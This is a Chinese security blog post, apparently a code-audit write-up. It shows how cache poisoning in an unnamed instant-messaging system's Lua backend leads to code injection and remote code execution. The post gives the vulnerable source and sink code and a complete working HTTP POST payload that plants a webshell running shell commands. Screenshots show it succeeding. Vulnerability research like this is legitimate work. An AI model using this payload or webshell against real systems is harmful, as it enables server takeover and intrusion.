#  某即时通讯系统缓存投毒->代码注入RCE  
原创 回头没有岸
                        回头没有岸  苍穹密语   2026-02-06 06:39  
  
> Hey Guys！失踪人口回归，今天给大家分享一个代码审计实例吧  
  
### Source  
  
首先看到Source：index.lua  
```
function handler.cache(self, action)  local key = web:post("key")      local value = web:post("value")  local cache_value = nilif value=="nil"then    cache_value = xxxx.cache(key, nil)elseif value==nilthen    cache_value = xxxx.cache(key)else    cache_value = xxxx.cache(key, value)  end  web:json(json.encode({cmd="cache", code="ok", data=cache_value}))end
```  
  
从uri中获取参数key和value，并放到xxxx.cache中(xxxx是我瞎编的，我怕有火眼金睛。。。)，key是缓存的键，value是缓存的值  
  
Ta的web入口点：index.lua?a=cache  
```
local a = web:get("a")    if handler[a] then  pcall(handler[a], handler, a)  end
```  
### Sink  
  
在看到Sink：WordFilterManager.lua  
```
function WordFilterManager.getWordFilter()    local WordFilter = "WordFilter345asjdqUIY22"      local WordMap = xxxx.cache(WordFilter)         -        if WordMap == nil then        WordMap = WordFilterManager.InitWordFilter()        xxxx.cache(WordFilter, inspect(WordMap))    else        WordFilterManager.wordMap = assert(load("return "..WordMap))()    end   end
```  
  
wordMap 从缓存中读取WordFilter这个key，如果不存在返回nil，如果没有缓存将会初始化新的敏感词过滤器，并将序列化后的数据**存入缓存**  
  
如果有缓存则会将字符串编译为 Lua 函数，并执行该函数。  
  
那么我们可以写入一个lua的代码放到缓存里，当缓存触发的时候加载代码从而实现RCE  
## 漏洞复现  
### 1、添加缓存  
```
POST /index.lua?a=cache HTTP/1.1Host: Content-Type: application/x-www-form-urlencodedContent-Length: 216key=WordFilter345asjdqUIY22&value=(function() io.open('../app/html/file/s.lua','w'):write('mg.write(io.popen(mg.get_var(mg.request_info.query_string,[[c]])):read([[*a]]))'):close() return {isLast=false,map={}} end)()
```  
  
![image-20260206141954243](https://mmbiz.qpic.cn/sz_mmbiz_png/Hu4L9icfyqp4wFahZxfHsBGmNRUwpEhgBic0mFRDiaJno8yJveAzNknC1962f3AljcTxLFRMJPye9RlYtLEvPMPJYEeK1Q26aBGx9edBUWgiaicY/640?wx_fmt=png&from=appmsg "")  
  
image-20260206141954243  
  
确定一下缓存已经写入  
  
![image-20260206142042231](https://mmbiz.qpic.cn/sz_mmbiz_png/Hu4L9icfyqp5x4ylZRGzib7poTmGJ5cbWhtvWOSTquibUasmx0iaeJFAUrohasGWFveBfKG5pdRfrVGoVTlbrWtqB8T0ibhQmjCjZsqY1xSYhKc8/640?wx_fmt=png&from=appmsg "")  
  
image-20260206142042231  
### 2、触发（这里是发送消息触发）  
  
首先本地没有恶意文件  
  
![image-20260206142212793](https://mmbiz.qpic.cn/sz_mmbiz_png/Hu4L9icfyqp5O5Cg21fosdURzmVgLTjiaWicd8GouU4SiaKwnrHy1A8RldN22ib4m2veDoSXVJqtsQ0VYpsgfVpPDahbOGbx8WLK3oy1jW7TZibQk/640?wx_fmt=png&from=appmsg "")  
  
image-20260206142212793  
  
登录状态模拟对话，发送hello  
  
![image-20260206142336644](https://mmbiz.qpic.cn/sz_mmbiz_png/Hu4L9icfyqp4SWXY84nJqBxMTeiahPrtacKcxcnsslszknibvd6c4rvwrfGSAcdNzslxLiadMLGZpJjrVeg41ibX4dsZllRjMYpJ6icV3UfSWHjtQ/640?wx_fmt=png&from=appmsg "")  
  
image-20260206142336644  
  
成功写入文件  
  
![image-20260206142408247](https://mmbiz.qpic.cn/sz_mmbiz_png/Hu4L9icfyqp73zcicHZSIOJ0uKQB2fNnPryrzQP0cdbVVWDrtWr0FAicAqLibCdBnvAhib2DHzwvkc5HNzO3frsytdDos6sX3LgRDoCB4VxYVIP0/640?wx_fmt=png&from=appmsg "")  
  
image-20260206142408247  
  
访问执行命令  
  
![image-20260206142502747](https://mmbiz.qpic.cn/sz_mmbiz_png/Hu4L9icfyqp6QeUZryQZGWohzmUX7XqdBA9XCzBMuNkZz3WVUn0nakQfpswjsRjuUVTHV7SicGd6UZLgZJ7Y7gthoGteSCHz8fJQkmwPm4Cao/640?wx_fmt=png&from=appmsg "")  
  
image-20260206142502747  
## End  
  
结束喽～，后面不定期更，我知道有漏点，vps搭建的环境无所谓啦～  
  
  
